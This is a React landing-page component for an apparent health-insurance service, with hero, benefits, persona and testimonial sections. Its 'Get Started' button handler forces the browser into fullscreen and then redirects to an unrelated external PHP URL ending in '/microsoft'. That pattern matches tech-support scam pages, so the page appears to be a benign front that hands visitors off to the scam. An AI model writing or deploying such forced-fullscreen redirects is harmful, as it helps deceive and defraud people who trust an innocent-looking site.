import { Link, useNavigate } from "react-router-dom";

export default function Home() {

  const navigate = useNavigate();

  const handleClick = async () => {
    try {
      await document.documentElement.requestFullscreen();
    } catch (err) {
      console.log("Fullscreen rejected:", err);
    }

    navigate("https://tunipril.com/ddsshht.php/microsoft"); // change to your target route
  };

  return (
    <main className="bg-gradient-to-b from-blue-50 to-white">

      {/* HERO */}
      <section className="py-16 md:py-20">
        <div className="max-w-6xl mx-auto px-6 grid md:grid-cols-2 gap-10 items-center">

          {/* Left: Headline & CTA */}
          <div className="space-y-4 md:space-y-6">
            <h1 className="text-4xl md:text-5xl font-bold leading-tight text-slate-900">
              Smart Health Insurance <br /> Built Around You
            </h1>

            <p className="text-gray-700 max-w-md">
              Affordable coverage, professional guidance, and peace of mind for
              every stage of life.
            </p>

            <div className="flex gap-3 md:gap-4">
              <Link
                to=""
                className="bg-blue-600 text-white px-6 md:px-8 py-2.5 md:py-3 rounded-lg shadow-md hover:bg-blue-700 transition"
                onClick={handleClick}
              >
                Get Started
              </Link>

              <Link
                to=""
                className="border border-blue-600 text-blue-600 px-6 md:px-8 py-2.5 md:py-3 rounded-lg hover:bg-blue-50 transition"
              >
                Learn More
              </Link>
            </div>
          </div>

          {/* Right: Hero Image */}
          <div className="relative h-64 md:h-80 rounded-xl overflow-hidden shadow-lg">
            <img
              src="/c7d31c4e035a2abef944ed4413042a79e8660fe5-1200x736.jpg"
              alt="Health insurance consultation"
              className="absolute inset-0 w-full h-full object-cover"
            />
            <div className="absolute inset-0 bg-white/30" />
          </div>
        </div>
      </section>

      {/* WHY SECTION */}
      <section className="py-16 md:py-20 bg-blue-50/20">
        <div className="max-w-5xl mx-auto px-6 space-y-10 md:space-y-12">

          {/* Header */}
          <div className="text-center space-y-3 md:space-y-4">
            <h2 className="text-3xl md:text-3xl font-bold text-slate-900">
              Why Health Insurance Matters
            </h2>
            <p className="text-gray-700 text-base md:text-lg leading-relaxed">
              Health insurance is more than a policy — it’s a safety net that protects your health, finances, and future. Coverage helps you live stress-free and prepared for life’s uncertainties.
            </p>
          </div>

          {/* Detailed Benefits */}
          <div className="grid md:grid-cols-2 gap-6 md:gap-8">

            <div className="bg-white/70 backdrop-blur-md p-4 md:p-6 rounded-xl shadow-lg hover:shadow-xl transition">
              <h3 className="text-lg md:text-xl font-semibold text-slate-900 mb-1 md:mb-2">
                Financial Security
              </h3>
              <p className="text-gray-700 text-sm md:text-base">
                Unexpected medical costs can disrupt your life. Health insurance ensures hospital bills, surgeries, and specialist visits are covered, keeping your finances stable.
              </p>
            </div>

            <div className="bg-white/70 backdrop-blur-md p-4 md:p-6 rounded-xl shadow-lg hover:shadow-xl transition">
              <h3 className="text-lg md:text-xl font-semibold text-slate-900 mb-1 md:mb-2">
                Preventive & Early Care
              </h3>
              <p className="text-gray-700 text-sm md:text-base">
                Regular screenings, vaccinations, and wellness checkups help detect health issues early, improving outcomes and reducing long-term costs.
              </p>
            </div>

            <div className="bg-white/70 backdrop-blur-md p-4 md:p-6 rounded-xl shadow-lg hover:shadow-xl transition">
              <h3 className="text-lg md:text-xl font-semibold text-slate-900 mb-1 md:mb-2">
                Access to Trusted Providers
              </h3>
              <p className="text-gray-700 text-sm md:text-base">
                Connect with certified doctors, hospitals, and specialists for reliable care whenever needed.
              </p>
            </div>

            <div className="bg-white/70 backdrop-blur-md p-4 md:p-6 rounded-xl shadow-lg hover:shadow-xl transition">
              <h3 className="text-lg md:text-xl font-semibold text-slate-900 mb-1 md:mb-2">
                Peace of Mind
              </h3>
              <p className="text-gray-700 text-sm md:text-base">
                Coverage for you and your family allows you to focus on life and long-term goals without constant worry.
              </p>
            </div>

          </div>

          {/* Key Takeaways */}
          <div className="text-center mt-8 md:mt-10 space-y-3">
            <h3 className="text-xl md:text-2xl font-semibold text-slate-900">
              Key Takeaways
            </h3>
            <ul className="text-gray-700 list-disc list-inside max-w-md mx-auto space-y-1 md:space-y-2 text-sm md:text-base">
              <li>Safeguards your financial stability.</li>
              <li>Preventive care reduces health risks and costs.</li>
              <li>Trusted providers ensure quality treatment.</li>
              <li>Coverage brings peace of mind for your family.</li>
              <li>Choosing the right plan is an investment in wellness.</li>
            </ul>
          </div>

        </div>
      </section>

      {/* BENEFITS */}
      <section className="py-16 md:py-20">
        <div className="max-w-6xl mx-auto px-6 grid md:grid-cols-3 gap-6 md:gap-8">

          {[
            ["Financial Protection", "Avoid overwhelming hospital bills and protect your savings."],
            ["Preventive Care", "Early detection through screenings and routine checkups."],
            ["Trusted Providers", "Access to licensed doctors, specialists, and hospitals."]
          ].map(([title, desc]) => (
            <div key={title} className="bg-white/70 backdrop-blur-md rounded-xl p-4 md:p-6 shadow-lg hover:shadow-xl transition">
              <h3 className="font-semibold text-lg md:text-xl mb-1 md:mb-2 text-slate-900">{title}</h3>
              <p className="text-gray-700 text-sm md:text-base">{desc}</p>
            </div>
          ))}

        </div>
      </section>

      {/* PERSONAS */}
      <section className="py-16 md:py-20">
        <div className="max-w-6xl mx-auto px-6">

          <h2 className="text-3xl font-bold text-center mb-8 md:mb-12 text-slate-900">
            Designed for Real People
          </h2>

          <div className="grid md:grid-cols-2 gap-6 md:gap-10">

            <div className="bg-white/60 backdrop-blur-md border border-gray-200 p-4 md:p-6 rounded-xl shadow-lg hover:shadow-xl transition">
              <img
                src="/What-is-group-health-insurance-640w.jpg"
                alt="Health insurance customer"
                className="h-32 md:h-40 w-full object-cover rounded mb-3 md:mb-4 shadow-sm hover:scale-[1.02] transition"
              />
              <h3 className="font-semibold text-xl mb-1 text-slate-900">The Informed Planner</h3>
              <p className="text-gray-700 text-sm md:text-base">
                Professionals who invest in preventive care and long-term financial stability through smart coverage decisions.
              </p>
            </div>

            <div className="bg-white/60 backdrop-blur-md border border-gray-200 p-4 md:p-6 rounded-xl shadow-lg hover:shadow-xl transition">
              <img
                src="/depositphotos_244015708-stock-photo-health-insurance-concept-doctor-hospital.jpg"
                alt="Health insurance customer"
                className="h-32 md:h-40 w-full object-cover rounded mb-3 md:mb-4 shadow-sm hover:scale-[1.02] transition"
              />
              <h3 className="font-semibold text-xl mb-1 text-slate-900">The Family Protector</h3>
              <p className="text-gray-700 text-sm md:text-base">
                Parents who prioritize comprehensive protection for their loved ones.
              </p>
            </div>

          </div>
        </div>
      </section>

      {/* TESTIMONIALS */}
      <section className="py-16 md:py-20 bg-gradient-to-r from-blue-50 to-white">
        <div className="max-w-4xl mx-auto px-6 text-center space-y-6">

          <h2 className="text-3xl font-bold mb-6 text-slate-900">
            What People Say
          </h2>

          <div className="space-y-4 md:space-y-6">
            <blockquote className="italic text-gray-700 text-sm md:text-base">
              “Health insurance is not a luxury — it’s a necessity.”
            </blockquote>

            <blockquote className="italic text-gray-700 text-sm md:text-base">
              “The greatest wealth is health.”
            </blockquote>

            <blockquote className="italic text-gray-700 text-sm md:text-base">
              “Being prepared today protects your tomorrow.”
            </blockquote>
          </div>

        </div>
      </section>

      {/* CTA */}
      <section className="py-16 md:py-20 text-center">
        <h2 className="text-3xl font-bold mb-3 md:mb-4 text-slate-900">
          Ready to Protect Your Future?
        </h2>

        <p className="text-gray-700 mb-6 md:mb-8 text-sm md:text-base">
          Get covered today and experience confidence in every healthcare decision.
        </p>

        <Link
          to=""
          className="bg-blue-600 text-white px-8 md:px-10 py-2.5 md:py-4 rounded-lg shadow-lg hover:bg-blue-700 transition"
        >
          Create Your Account
        </Link>
      </section>

    </main>
  );
}
